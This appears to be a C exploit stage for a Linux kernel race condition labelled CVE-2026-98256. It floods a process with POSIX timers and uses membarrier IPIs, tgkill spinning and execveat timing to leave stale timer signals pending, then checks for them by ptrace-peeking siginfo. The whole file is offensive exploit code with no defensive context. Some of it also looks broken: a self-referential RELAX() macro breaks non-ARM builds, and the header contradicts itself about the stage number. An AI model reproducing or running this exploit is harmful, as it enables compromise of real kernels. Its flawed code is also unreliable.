/* stage2 - CVE-2026-98256 stage 1: hit the pending-list race with membarrier IPIs */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <pthread.h>
#include <stdint.h>
#include <time.h>
#include <sched.h>
#include <linux/membarrier.h>
#include <sys/ptrace.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>

#ifndef SIGEV_THREAD_ID
#define SIGEV_THREAD_ID 4
#endif
#define AT_EMPTY_PATH 0x1000
#define N_TIMERS 20000
#define GROUP 16
#define GAP_NS 4700LL
#define DELAY_NS 100000LL
#define LIMIT 12288
#define LEAD_NS 80000LL
#define CALLBACK_CPU 0
#define STACKSZ (1u<<20)
#if defined(__aarch64__)
#define RELAX() asm volatile("yield" ::: "memory")
#else
#define RELAX() RELAX()
#endif

struct train_args { int64_t target; int cpu_id; int command; int flags; int source_cpu; pid_t worker_tid; };

static pid_t g_leader_tid;
static int g_sig, g_sent, g_exe_fd = -1;
static volatile int g_gate;
static int g_cpus = 4;

static int64_t mono_ns(void){ struct timespec t; clock_gettime(CLOCK_MONOTONIC,&t); return (int64_t)t.tv_sec*1000000000LL+t.tv_nsec; }
static int pin_cpu(int c){ cpu_set_t s; CPU_ZERO(&s); CPU_SET(c%g_cpus,&s); return sched_setaffinity(0,sizeof(s),&s); }

static int kt_create(pid_t tid, int tag)
{
    struct sigevent sev; int id=-1;
    memset(&sev,0,sizeof(sev));
    sev.sigev_notify = SIGEV_SIGNAL|SIGEV_THREAD_ID;
    sev.sigev_signo = g_sig;
    sev.sigev_value.sival_int = tag;
    sev._sigev_un._tid = tid;
    if (syscall(SYS_timer_create, CLOCK_MONOTONIC, &sev, &id)) return -1;
    return id;
}
static int kt_arm(int id, int64_t ns)
{
    struct itimerspec its; memset(&its,0,sizeof(its));
    its.it_value.tv_sec = ns/1000000000LL;
    its.it_value.tv_nsec = ns%1000000000LL;
    return syscall(SYS_timer_settime, id, TIMER_ABSTIME, &its, NULL);
}

static int train_fn(void *p)
{
    struct train_args a = *(struct train_args*)p;
    int64_t end, next = 0; int fail = 0;
    if (pin_cpu(a.source_cpu)) fail++;
    if (a.source_cpu == 2) {
        while (mono_ns() < a.target - 500000) RELAX();
        while (!syscall(SYS_tgkill, g_leader_tid, a.worker_tid, 0)) RELAX();
        if (errno != ESRCH) fail++;
        __atomic_store_n(&g_gate, 1, __ATOMIC_RELEASE);
    } else {
        while (!__atomic_load_n(&g_gate, __ATOMIC_ACQUIRE)) RELAX();
    }
    end = mono_ns() + 5000000;
    if (a.source_cpu == 3) next = mono_ns();
    while (mono_ns() < end) {
        if (a.source_cpu == 3 && mono_ns() >= next) {
            siginfo_t si; memset(&si,0,sizeof(si));
            si.si_signo = g_sent; si.si_code = SI_QUEUE;
            si.si_pid = (pid_t)syscall(SYS_getpid); si.si_uid = getuid();
            si.si_value.sival_int = 0x53454e54;
            if (syscall(SYS_rt_tgsigqueueinfo, g_leader_tid, g_leader_tid, g_sent, &si) && errno != ESRCH) fail++;
            next += 100000LL;
        }
        if (syscall(SYS_membarrier, a.command, a.flags, 0)) fail++;
    }
    return fail ? 1 : 0;
}

static pid_t spawn_train(struct train_args *a)
{
    void *st = mmap(NULL, STACKSZ, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0);
    if (st == MAP_FAILED) return -1;
    return (pid_t)clone(train_fn, (char*)st + STACKSZ, CLONE_VM|SIGCHLD, a);
}

static void *worker(void *u)
{
    static int ids[N_TIMERS];
    struct train_args a2, a3;
    int64_t target; int made = 0, end; pid_t wtid;
    (void)u;
    pin_cpu(1);
    signal(SIGCHLD, SIG_IGN);
    usleep(20000);
    for (int i = 0; i < N_TIMERS; i++) {
        ids[i] = kt_create(g_leader_tid, 0x28000000 | (i & 0xffffff));
        if (ids[i] < 0 || kt_arm(ids[i], 1)) break;
        made++;
    }
    dprintf(2, "[worker] made=%d\n", made);
    if (made < 1024) _exit(2);
    usleep(5000);
    target = mono_ns() + 150000000LL;
    wtid = (pid_t)syscall(SYS_gettid);
    if (syscall(SYS_membarrier, MEMBARRIER_CMD_REGISTER_PRIVATE_EXPEDITED, 0, 0))
        dprintf(2, "[worker] mb register failed errno=%d\n", errno);
    memset(&a2,0,sizeof(a2)); a2.target=target; a2.cpu_id=CALLBACK_CPU;
    a2.command=MEMBARRIER_CMD_PRIVATE_EXPEDITED; a2.flags=0;   /* RSEQ variant unsupported here */
    a2.source_cpu=2; a2.worker_tid=wtid; a3=a2; a3.source_cpu=3;
    if (spawn_train(&a2) < 0 || spawn_train(&a3) < 0) { dprintf(2,"[worker] train spawn failed\n"); _exit(3); }
    for (int i = 0; i < made; i++) if (kt_arm(ids[i], target + 2000000000LL)) _exit(2);
    end = (LIMIT < made ? LIMIT : made); end -= end % GROUP;
    pin_cpu(CALLBACK_CPU);
    for (int k = 0; k < end; k++) {
        int64_t e = target + DELAY_NS + (int64_t)(k/GROUP)*GAP_NS;
        if (kt_arm(ids[k], e)) _exit(2);
    }
    pin_cpu(CALLBACK_CPU);
    if (mono_ns() >= target - LEAD_NS) dprintf(2,"[worker] late by %lld ns\n",(long long)(mono_ns()-(target-LEAD_NS)));
    while (mono_ns() < target - LEAD_NS) RELAX();
    {
        char *argv[] = { (char*)"stage2", (char*)"--exec-ok", NULL };
        syscall(SYS_execveat, g_exe_fd, "", argv, environ, AT_EMPTY_PATH);
        dprintf(2, "[worker] execveat err=%d\n", errno);
    }
    _exit(2);
}

struct peek_args { uint64_t off; uint32_t flags; int32_t nr; };

int main(int argc, char **argv)
{
    int rounds = argc > 1 ? atoi(argv[1]) : 5, hit = 0;
    if (argc > 1 && !strcmp(argv[1], "--exec-ok")) for(;;) pause();
    setvbuf(stdout, NULL, _IOLBF, 0);
    g_cpus = (int)sysconf(_SC_NPROCESSORS_ONLN);
    g_sig = SIGRTMIN + 2;
    g_sent = SIGRTMIN + 3;
    printf("=== stage2: race with membarrier IPIs (cpus=%d) ===\n", g_cpus);
    for (int r = 0; r < rounds; r++) {
        pid_t child; sigset_t b; int st = 0, good = 0, si = 0;
        sigemptyset(&b);
        for (int k = 0; k < 6; k++) sigaddset(&b, SIGRTMIN + k);
        sigprocmask(SIG_BLOCK, &b, NULL);
        child = fork();
        if (child == 0) {
            pthread_t th;
            g_leader_tid = (pid_t)syscall(SYS_gettid);
            g_exe_fd = open("/proc/self/exe", O_RDONLY);
            if (pthread_create(&th, NULL, worker, NULL)) _exit(3);
            syscall(SYS_exit, 0);
            _exit(4);
        }
        usleep(400000);
        if (ptrace(PTRACE_ATTACH, child, 0, 0) == 0) {
            waitpid(child, &st, 0);
            for (int off = 0; off < 4096; off++) {
                struct peek_args pa = { (uint64_t)off, 0, 1 };
                siginfo_t info; memset(&info, 0, sizeof(info));
                if (syscall(SYS_ptrace, PTRACE_PEEKSIGINFO, child, &pa, &info) != 1) break;
                if (info.si_code == SI_TIMER) {
                    si++;
                    if (((unsigned)info.si_value.sival_int >> 24) == 0x28) good++;
                }
            }
            ptrace(PTRACE_DETACH, child, 0, 0);
        } else {
            printf("  round %d: attach errno=%d\n", r, errno);
        }
        printf("  round %d: SI_TIMER=%d tagged=%d\n", r, si, good);
        if (good > 0) hit++;
        kill(child, SIGKILL); waitpid(child, &st, 0);
    }
    printf("stage2 done: rounds_with_stale=%d/%d\n", hit, rounds);
    return 0;
}
